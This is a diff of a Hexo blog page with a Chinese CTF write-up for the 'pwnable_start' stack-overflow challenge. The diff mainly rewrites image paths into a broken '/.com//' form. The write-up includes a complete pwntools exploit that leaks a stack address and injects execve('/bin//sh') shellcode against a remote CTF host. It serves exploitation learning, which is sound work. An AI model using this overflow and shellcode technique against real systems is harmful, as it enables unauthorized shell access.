@@ -23,18 +23,18 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="pwnable_start  我们先checksec一下：  可以看到，什么都没开的，IDA中看一看：  反汇编，是不可能反汇编的了，读一下吧，其实也是不难的，al,bl,dl,是eax,ebx,edx寄存器的末八位（即一字节），我们可以看看32位程序的系统调用规则和系统调用号：   可以知道，第一个调用的是write函数，第二个调用的是read函数，参数也很明显，第二个参数都是esp指向的位置，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/pwnable-start/1.png">
-<meta property="og:image" content="http://example.com/pwnable-start/2.png">
-<meta property="og:image" content="http://example.com/pwnable-start/3.png">
-<meta property="og:image" content="http://example.com/pwnable-start/4.png">
-<meta property="og:image" content="http://example.com/pwnable-start/5.png">
-<meta property="og:image" content="http://example.com/pwnable-start/6.png">
+<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/.com//3.png">
+<meta property="og:image" content="http://example.com/.com//4.png">
+<meta property="og:image" content="http://example.com/.com//5.png">
+<meta property="og:image" content="http://example.com/.com//6.png">
 <meta property="article:published_time" content="2024-06-09T07:16:51.000Z">
 <meta property="article:modified_time" content="2024-06-09T07:49:14.791Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/pwnable-start/1.png">
+<meta name="twitter:image" content="http://example.com/.com//1.png">
   
   
   
@@ -283,16 +283,16 @@
                 <h1 align="center">pwnable_start</h1>
 
 <p>我们先checksec一下：</p>
-<p><img src="/pwnable-start/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
 <p>可以看到，什么都没开的，IDA中看一看：</p>
-<p><img src="/pwnable-start/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>反汇编，是不可能反汇编的了，读一下吧，其实也是不难的，al,bl,dl,是eax,ebx,edx寄存器的末八位（即一字节），我们可以看看32位程序的系统调用规则和系统调用号：</p>
-<p><img src="/pwnable-start/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
-<p><img src="/pwnable-start/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="/.com//4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>可以知道，第一个调用的是write函数，第二个调用的是read函数，参数也很明显，第二个参数都是esp指向的位置，我们最后看到add esp，14h，retn 可知道，这个函数创建的区域大小就是0x14，连旧的ebp也没有，直接是返回地址，所以就不用多覆盖了（gdb调试也可以知道上述结论），所以read函数，读入的0x3c是大于0x14的，存在栈溢出漏洞：</p>
-<p><img src="/pwnable-start/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>栈段具有最高的权限，写入栈段就可以执行了，那么，我们得泄露栈的地址，那就只能返回到write函数了，也就是溢出返回到0x08048087，这样esp就指向0xffffd42c,write函数就会泄露出0xffffd430，在它下面的栈地址，此时read函数，就会向0xfffd42c开始，书写0x3c字节，但是函数结束，还是add esp，14h，retn,所以可以继续溢出：</p>
-<p><img src="/pwnable-start/6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
+<p><img src="/.com//6.png" srcset="/img/loading.gif" lazyload alt="6"></p>
 <p>payload如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python2">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br>context.arch = &#x27;i386&#x27;<br>context.os = &#x27;linux&#x27;<br><br><br>sh = remote(&quot;node5.buuoj.cn&quot;,27873)<br>#sh = process(&quot;./start&quot;)<br><br>sh.recvuntil(&quot;Let&#x27;s start the CTF:&quot;)<br>sh.send(b&quot;A&quot;*(0x14) + p32(0x8048087))<br><br>stack = u32(sh.recv(4))<br>sh.recv()<br>print(hex(stack))<br><br>shellcode = asm(<br>    &quot;&quot;&quot;<br>    xor edx, edx<br>    push edx<br>    push 0x68732f6e   <br>    push 0x69622f2f<br>    mov ebx, esp<br>    xor ecx, ecx<br>    xor edx, edx<br>    mov eax, 0xb<br>    int 0x80<br>    &quot;&quot;&quot;<br>)<br><br>payload = b&quot;A&quot;*(0x14) + p32(stack+0x14) + shellcode<br>sh.sendline(payload)<br>sh.interactive()<br><br># /bin//sh<br></code></pre></td></tr></table></figure>
 
